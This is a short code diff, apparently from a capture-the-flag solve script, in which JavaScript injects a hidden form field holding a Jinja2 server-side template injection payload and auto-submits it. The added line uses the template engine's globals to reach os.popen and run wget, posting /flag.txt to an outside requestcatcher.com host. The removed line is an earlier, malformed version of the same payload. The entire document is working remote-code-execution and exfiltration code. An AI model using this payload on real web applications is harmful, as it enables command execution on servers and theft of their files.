@@ -14,7 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag.txt')['wget https://singetu0096.requestcatcher.com/ --post-file=/flag.txt']()}}`;
+      i.value = `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('wget https://singetu0096.requestcatcher.com/ --post-file=/flag.txt')['read']()}}`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
